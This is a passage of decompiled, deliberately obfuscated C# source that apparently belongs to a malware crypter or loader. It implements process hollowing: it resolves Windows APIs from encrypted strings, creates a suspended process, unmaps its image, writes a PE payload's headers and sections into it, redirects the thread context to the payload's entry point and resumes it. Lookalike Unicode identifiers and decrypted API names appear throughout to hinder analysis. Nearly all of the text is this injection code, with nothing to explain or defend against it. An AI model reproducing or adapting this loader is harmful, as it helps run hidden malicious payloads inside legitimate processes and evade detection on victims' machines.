      Ʀυŋƥȝƪąƨƨ.VA va = Ʀυŋƥȝƪąƨƨ.ṞȝąƫȝĄƥƚ<Ʀυŋƥȝƪąƨƨ.VA>(Ʀυŋƥȝƪąƨƨ.DecryptData("zYiOpcm6S1gb ", "u6/Jwa+9S0kb"), Ʀυŋƥȝƪąƨƨ.DecryptData("oqy5n9CleJDDpLV9nLwt ", "kbfJzc+nvWe9vcOrb9Ub"));
      Ʀυŋƥȝƪąƨƨ.STC stc = Ʀυŋƥȝƪąƨƨ.ṞȝąƫȝĄƥƚ<Ʀυŋƥȝƪąƨƨ.STC>(Ʀυŋƥȝƪąƨƨ.DecryptData("0o2zrc6/dGUX ", "v7PNxbPBT00X"), Ʀυŋƥȝƪąƨƨ.DecryptData("tpW9n8zNzKjQct3fz5bXsxc= ", "j7PRkbnNs6uxb8fF0bPZ0Rc="));
      Ʀυŋƥȝƪąƨƨ.RT rt = Ʀυŋƥȝƪąƨƨ.ṞȝąƫȝĄƥƚ<Ʀυŋƥȝƪąƨƨ.RT>(Ʀυŋƥȝƪąƨƨ.DecryptData("s627dq+OfHkw ", "ppq0rJqoNjQw"), Ʀυŋƥȝƪąƨƨ.DecryptData("kovAg76yoaWzjIBwMA== ", "dJq2uqqaeKC0mpKYMA=="));
      long num1 = 0;
      long num2 = 0;
      startup.CB = Strings.Len((object) startup);
      Cøŋƫȝϫƫ.Ƒƪąǥƨ = 65539U;
      IntPtr system;
      if (structure2.Ƨƚǥŋąƫυṟȝ != 17744U || structure1.Мąǥƚc != (ushort) 23117 || -(cp((string) null, ƫąṟǥȝƫ, ref process1, ref thread, false, 4U, system, (string) null, ref startup, out info) ? 1 : 0) == 0)
        return;
      if (Ʀυŋƥȝƪąƨƨ.Ϣƚŋ7())
      {
        int num3 = gtc(info.ƬħṟȝąƋ, ref Cøŋƫȝϫƫ) ? 1 : 0;
        Ʀυŋƥȝƪąƨƨ.RPM rpm2 = rpm1;
        IntPtr process2 = info.Process;
        int address = checked ((int) ((long) Cøŋƫȝϫƫ.Ȝƀϫ + 8L));
        int num4 = 0;
        ref int local1 = ref num4;
        int num5 = 0;
        ref int local2 = ref num5;
        int num6 = rpm2(process2, address, ref local1, 4, ref local2);
        long num7 = uvs(info.Process, 0);
      }
      else
      {
        int num8 = gtc(info.ƬħṟȝąƋ, ref Cøŋƫȝϫƫ) ? 1 : 0;
        Ʀυŋƥȝƪąƨƨ.RPM rpm3 = rpm1;
        IntPtr process3 = info.Process;
        int address1 = checked ((int) ((long) Cøŋƫȝϫƫ.Ȝƀϫ + 8L));
        int num9 = checked ((int) num1);
        ref int local3 = ref num9;
        int num10 = 0;
        ref int local4 = ref num10;
        int num11 = rpm3(process3, address1, ref local3, 4, ref local4);
        long address2 = (long) num9;
        long num12 = uvs(info.Process, checked ((int) address2));
      }
      uint num13 = checked ((uint) (int) va(info.Process, (int) structure2.Øƥƫƚøŋąƪ.Ɨɱąǥȝ, structure2.Øƥƫƚøŋąƪ.ƧƗɱąǥȝ, 12288U, 4U));
      if (num13 == 0U)
        return;
      Ʀυŋƥȝƪąƨƨ.WPM wpm2 = wpm1;
      IntPtr process4 = info.Process;
      int int32_2 = Convert.ToInt32(num13);
      byte[] buffer1 = Ƌąƫą;
      int int32_3 = Convert.ToInt32(structure2.Øƥƫƚøŋąƪ.ƧĦȝąƋȝṟƨ);
      int num14 = !Ʀυŋƥȝƪąƨƨ.Ϣƚŋ7() ? checked ((int) num2) : 0;
      ref int local5 = ref num14;
      int num15 = wpm2(process4, int32_2, buffer1, int32_3, out local5) ? 1 : 0;
      long num16 = (long) checked (structure1.ĄƋƋṟȝƨƨ + 248);
      int num17 = checked ((int) structure2.Ƒƚƪȝ.Ƨȝcƫƚøŋƨ - 1);
      int num18 = 0;
      while (num18 <= num17)
      {
        ptr = new IntPtr(checked ((long) int32_1 + num16 + (long) (num18 * 40)));
        Ʀυŋƥȝƪąƨƨ.ƧȝcƫƚøŋĦȝąƋȝṟ structure3 = (Ʀυŋƥȝƪąƨƨ.ƧȝcƫƚøŋĦȝąƋȝṟ) Marshal.PtrToStructure(ptr, structure3.GetType());
        byte[] numArray = new byte[checked ((int) structure3.Ƨƚȥȝ + 1)];
        int num19 = checked ((int) ((long) structure3.Ƨƚȥȝ - 1L));
        int index = 0;
        while (index <= num19)
        {
          numArray[index] = Ƌąƫą[checked ((int) ((long) structure3.Ƿøƚŋƫȝṟ + (long) index))];
          checked { ++index; }
        }
        Ʀυŋƥȝƪąƨƨ.WPM wpm3 = wpm1;
        IntPtr process5 = info.Process;
        int int32_4 = Convert.ToInt32(checked (num13 + structure3.ĄƋƋṟȝƨƨ));
        byte[] buffer2 = numArray;
        int int32_5 = Convert.ToInt32(structure3.Ƨƚȥȝ);
        int num20 = Ʀυŋƥȝƪąƨƨ.Ϣƚŋ7() ? 0 : checked ((int) num2);
        ref int local6 = ref num20;
        int num21 = wpm3(process5, int32_4, buffer2, int32_5, out local6) ? 1 : 0;
        checked { ++num18; }
      }
      byte[] bytes = BitConverter.GetBytes(num13);
      Ʀυŋƥȝƪąƨƨ.WPM wpm4 = wpm1;
      IntPtr process6 = info.Process;
      int address3 = checked ((int) ((long) Cøŋƫȝϫƫ.Ȝƀϫ + 8L));
      byte[] buffer3 = bytes;
      int num22 = 0;
      ref int local7 = ref num22;
      int num23 = wpm4(process6, address3, buffer3, 4, out local7) ? 1 : 0;
      Cøŋƫȝϫƫ.Ȝąϫ = checked (num13 + structure2.Øƥƫƚøŋąƪ.ĄƋƋṟȝƨƨ);
      int num24 = stc(info.ƬħṟȝąƋ, ref Cøŋƫȝϫƫ) ? 1 : 0;
      int num25 = (int) rt(info.ƬħṟȝąƋ);
    }

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string υ62Ƿƚǫ);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr ħąŋƋƪȝ, [MarshalAs(UnmanagedType.VBByRefStr)] ref string υ62Ƿƚǫ);

    private static ƬƬ ṞȝąƫȝĄƥƚ<ƬƬ>(string υ62Ƿƚǫ, string ϫ7ƑṾṿυ1Ȝϣ) => (ƬƬ) Marshal.GetDelegateForFunctionPointer(Ʀυŋƥȝƪąƨƨ.GetProcAddress(Ʀυŋƥȝƪąƨƨ.LoadLibraryA(ref υ62Ƿƚǫ), ref ϫ7ƑṾṿυ1Ȝϣ), typeof (ƬƬ));

    public struct ACL1
    {
      public byte AclRevision;
      public byte Sbz1;
      public short AclSize;
      public short AceCount;
      public short Sbz2;
    }

    public struct GENERIC_MAPPING1
    {
      public int GenericRead;
      public int GenericWrite;
      public int GenericExecute;
      public int GenericAll;
    }

    public struct SECURITY_DESCRIPTOR1
    {
      public byte Revision;
      public byte Sbz1;
      public int Control;
      public int Owner;
      public int Group;
      public Ʀυŋƥȝƪąƨƨ.ACL1 Sacl;
      public Ʀυŋƥȝƪąƨƨ.ACL21 Dacl;
    }

    public struct POINTAPI11
    {
      public int x;
      public int y;
    }

    public struct ACL21
    {
      public byte AclRevision;
      public byte Sbz1;
      public short AclSize;
      public short AceCount;
      public short Sbz2;
    }

    public struct POINTAPI61
    {
      public int x;
      public int y;
    }

    public struct ACL31
    {
      public byte AclRevision;
      public byte Sbz1;
      public short AclSize;
      public short AceCount;
      public short Sbz2;
    }

    public struct ACL51
    {
      public byte AclRevision;
      public byte Sbz1;
      public short AclSize;
      public short AceCount;
      public short Sbz2;
    }

    public struct LARGE_INTEGER1
    {
      public int lowpart;
      public int highpart;
    }

    public struct PALETTEENTRY1
    {
      public byte peRed;
      public byte peGreen;
      public byte peBlue;
      public byte peFlags;
    }

    public struct COORD11
    {
      public short x;
      public short y;
    }

    public struct EVENTLOGRECORD1
    {
      public int Length;
      public int Reserved;
      public int RecordNumber;
      public int TimeGenerated;
      public int TimeWritten;
      public int EventID;
      public short EventStructure;
      public short NumStrings;
      public short EventCategory;
      public short ReservedFlags;
      public int ClosingRecordNumber;
      public int StringOffset;
      public int UserSidLength;
      public int UserSidOffset;
      public int DataLength;
      public int DataOffset;
    }

    public struct RECT1
    {
      public int Left;
      public int Top;
      public int Right;
      public int Bottom;
    }

    public struct WAVEHDR11
    {
      public string lpData;
      public int dwBufferLength;
      public int dwBytesRecorded;
      public int dwUser;
      public int dwFlags;
      public int dwLoops;
      public int lpNext;
      public int Reserved;
    }

    public struct POINTAPI71
    {
      public int x;
      public int y;
    }

    public struct CANDIDATEFORM1
    {
      public int dwIndex;
      public int dwStyle;
      public Ʀυŋƥȝƪąƨƨ.POINTAPI11 ptCurrentPos;
      public Ʀυŋƥȝƪąƨƨ.RECT1 rcArea;
    }

    public struct RECT31
    {
      public int Left;
      public int Top;
      public int Right;
      public int Bottom;
    }

    public struct POINTAPI111
    {
      public int x;
      public int y;
    }

    public struct COMPOSITIONFORM1
    {
      public int dwStyle;
      public Ʀυŋƥȝƪąƨƨ.POINTAPI11 ptCurrentPos;
      public Ʀυŋƥȝƪąƨƨ.RECT1 rcArea;
    }

    public struct POINTAPI21
    {
      public int x;
      public int y;
    }

    public struct MIDIHDR11
    {
      public string lpData;
      public int dwBufferLength;
      public int dwBytesRecorded;
      public int dwUser;
      public int dwFlags;
      public int lpNext;
      public int Reserved;
    }

    public struct MIDIINCAPS11
    {
      public short wMid;
      public short wPid;
      public int vDriverVersion;
      public string szPname;
    }

    public struct MIXERCONTROLDETAILS11
    {
      public int cbStruct;
      public int dwControlID;
      public int cChannels;
      public int item;
      public int cbDetails;
      public int paDetails;
    }

    public struct MIXERCAPS11
    {
      public short wMid;
      public short wPid;
      public int vDriverVersion;
      public string szPname;
      public int fdwSupport;
      public int cDestinations;
    }

    public struct MIXERCONTROL11
    {
      public int cbStruct;
      public int dwControlID;
      public int dwControlStructure;
      public int fdwControl;
      public int cMultipleItems;
      public string szShortName;
      public string szName;
      public int[] Bounds;
      public int[] Metrics;
    }

    public struct MIXERLINECONTROLS111
    {
      public int cbStruct;
      public int dwLineID;
      public int dwControl;
      public int cControls;
      public int cbmxctrl;
      public Ʀυŋƥȝƪąƨƨ.MIXERCONTROL11 pamxctrl;
    }

    public struct Cøŋƫȝϫƫ
    {
      public uint Ƒƪąǥƨ;
      public uint Ɖ0;
      public uint Ɖ1;
      public uint Ɖ2;
      public uint Ɖ3;
      public uint Ɖ6;
      public uint Ɖ7;
      public Ʀυŋƥȝƪąƨƨ.Ƨąṿȝ Ƨąṿȝ;
      public uint ƧƓ;
      public uint ƧƑ;
      public uint ƧȜ;
      public uint ƧƉ;
      public uint ȜƋƚ;
      public uint Ȝƨƚ;
      public uint Ȝƀϫ;
      public uint ȜƋϫ;
      public uint Ȝcϫ;
      public uint Ȝąϫ;
      public uint Ȝƀƥ;
      public uint Ȝƚƥ;
      public uint Ƨc;
      public uint ȜƑƪąǥƨ;
      public uint Ȝƨƥ;
      public uint ƧƧ;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
      public byte[] Ʀȝǥƚƨƫȝṟƨ;
    }

    public struct Ƨąṿȝ
    {
      public uint Cøŋƫṟøƪ;
      public uint Ƨƫąƫυƨ;
      public uint Ƭąǥ;
      public uint ȜṟṟøṟØ;
      public uint ȜṟṟøṟƧ;
      public uint ƉąƫąØ;
      public uint ƉąƫąƧ;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
      public byte[] ƦȝǥƚƨƫȝṟĄṟȝą;
      public uint Ƨƫąƫȝ;
    }

    public struct Мƚƨc
    {
      public uint ĄƋƋṟȝƨƨ;
      public uint Ƨƚȥȝ;
    }

    public struct ƧȝcƫƚøŋĦȝąƋȝṟ
    {
      public byte υ62Ƿƚǫ;
      public Ʀυŋƥȝƪąƨƨ.Мƚƨc Мƚƨc;
      public uint ĄƋƋṟȝƨƨ;
      public uint Ƨƚȥȝ;
      public uint Ƿøƚŋƫȝṟ;
      public uint ǷƦȝƪøcąƫƚøŋƨ;
      public uint ǷLƚŋȝƨ;
      public uint ŊƦȝƪøcąƫƚøŋƨ;
      public uint ŊLƚŋȝƨ;
      public uint Ƒƪąǥƨ;
    }

    public struct ǷṟøcȝƨƨƗŋƒøṟɱąƫƚøŋ
    {
      public IntPtr Process;
      public IntPtr ƬħṟȝąƋ;
      public int ǷṟøcȝƨƨƗƋ;
      public int ƬħṟȝąƋƗƋ;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct ƧƫąṟƫυƥƗŋƒøṟɱąƫƚøŋ
    {
      public int CB;
      public string ƦȝƨȝṟṿȝƋĄ;
      public string Ɖȝƨƙƫøƥ;
      public string Ƭƚƫƪȝ;
      public int Ϫ;
      public int Ƴ;
      public int ϪƧƚȥȝ;
      public int ƳƧƚȥȝ;
      public int ϪCøυŋƫ;
      public int ƳCøυŋƫ;
      public int Ƒƚƪƪ;
      public int Ƒƪąǥƨ;
      public short ƧħøϣϢƚŋƋøϣ;
      public short ƦȝƨȝṟṿȝƋB;
      public int ƦȝƨȝṟṿȝƋC;
      public int ƚŋƥυƫ;
      public int Øυƫƥυƫ;
      public int Ȝṟṟøṟ;
    }

    public struct ƧȝcυṟƚƫƴƑƪąǥƨ
    {
      public int Lȝŋǥƫħ;
      public IntPtr Ɖȝƨcṟƚƥƫøṟ;
      public int Ɨŋħȝṟƚƫ;
    }

    public struct ƉøƨĦȝąƋȝṟ
    {
      public ushort Мąǥƚc;
      public ushort Ląƨƫ;
      public ushort Ƿąǥȝƨ;
      public ushort Ʀȝƪøcąƫƚøŋƨ;
      public ushort Ƨƚȥȝ;
      public ushort Мƚŋƚɱυɱ;
      public ushort Мąϫƚɱυɱ;
      public ushort ƧƧ;
      public ushort ƧǷ;
      public ushort Cħȝcƙƨυɱ;
      public ushort ƗǷ;
      public ushort CƧ;
      public ushort Ƭąƀƪȝ;
      public ushort Øṿȝṟƪąƴ;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
      public ushort[] ƦȝƨȝṟṿȝƋĄ;
      public ushort ƗƉ;
      public ushort Ɨŋƒø;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
      public ushort[] ƦȝƨȝṟṿȝƋB;
      public int ĄƋƋṟȝƨƨ;
    }

    public struct ŊƫĦȝąƋȝṟƨ
    {
      public uint Ƨƚǥŋąƫυṟȝ;
      public Ʀυŋƥȝƪąƨƨ.ƑƚƪȝĦȝąƋȝṟ Ƒƚƪȝ;
      public Ʀυŋƥȝƪąƨƨ.ØƥƫƚøŋąƪĦȝąƋȝṟƨ Øƥƫƚøŋąƪ;
    }

    public struct ƑƚƪȝĦȝąƋȝṟ
    {
      public ushort Мącħƚŋȝ;
      public ushort Ƨȝcƫƚøŋƨ;
      public uint Ƨƫąɱƥ;
      public uint Ƭąƀƪȝ;
      public uint Ƨƴɱƀøƪƨ;
      public ushort Ƨƚȥȝ;
      public ushort Ƒƪąǥƨ;
    }

    public struct ØƥƫƚøŋąƪĦȝąƋȝṟƨ
    {
      public ushort Мąǥƚc;
      public byte Major;
      public byte Minor;
      public uint ƧcøƋȝ;
      public uint ƗƉąƫą;
      public uint ƲƉąƫą;
      public uint ĄƋƋṟȝƨƨ;
      public uint CøƋȝ;
      public uint Ƌąƫą;
      public uint Ɨɱąǥȝ;
      public uint ƧȝcƫƚøŋĄ;
      public uint ƑƚƪȝĄ;
      public ushort МąjøṟØ;
      public ushort МƚŋøṟØ;
      public ushort МąjøṟƗ;
      public ushort МƚŋøṟƗ;
      public ushort МąjøṟƧ;
      public ushort МƚŋøṟƧ;
      public uint Ṿȝṟƨƚøŋ;
      public uint ƧƗɱąǥȝ;
      public uint ƧĦȝąƋȝṟƨ;
      public uint Cħȝcƙƨυɱ;
      public ushort Ƨυƀƨƴƨƫȝɱ;
      public ushort Ƒƪąǥƨ;
      public uint ƧƧƦȝƨȝṟṿȝ;
      public uint ƧƧCøɱɱƚƫ;
      public uint ƧĦƦȝƨȝṟṿȝ;
      public uint ƧĦCøɱɱƚƫ;
      public uint LƑƪąǥƨ;
      public uint Cøυŋƫ;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
      public Ʀυŋƥȝƪąƨƨ.ȥȥ_ƒŋ5ƫƪṟ8ǥŋø8ϣ7ϣc8j[] YZvBm2GrvaOfwbe9yyc;
    }

    public struct ȥȥ_ƒŋ5ƫƪṟ8ǥŋø8ϣ7ϣc8j
    {
      public uint ĄƋƋṟȝƨƨ;
      public uint Ƨƚȥȝ;
    }

    public delegate bool CP(
      string name,
      string command,
      ref Ʀυŋƥȝƪąƨƨ.ƧȝcυṟƚƫƴƑƪąǥƨ process,
      ref Ʀυŋƥȝƪąƨƨ.ƧȝcυṟƚƫƴƑƪąǥƨ thread,
      bool inherit,
      uint flags,
      IntPtr system,
      string current,
      [In] ref Ʀυŋƥȝƪąƨƨ.ƧƫąṟƫυƥƗŋƒøṟɱąƫƚøŋ startup,
      out Ʀυŋƥȝƪąƨƨ.ǷṟøcȝƨƨƗŋƒøṟɱąƫƚøŋ info);

    public delegate bool WPM(
      IntPtr process,
      int address,
      byte[] buffer,
      int size,
      out int written);

    public delegate int RPM(IntPtr process, int address, ref int buffer, int size, ref int read);

    public delegate IntPtr VA(
      IntPtr process,
      int address,
      uint size,
      uint type,
      uint protect);

    public delegate long UVS(IntPtr process, int address);

    public delegate uint RT(IntPtr thread);

    public delegate bool GTC(IntPtr thread, ref Ʀυŋƥȝƪąƨƨ.Cøŋƫȝϫƫ Cøŋƫȝϫƫ);

    public delegate bool STC(IntPtr thread, ref Ʀυŋƥȝƪąƨƨ.Cøŋƫȝϫƫ Cøŋƫȝϫƫ);
  }
}
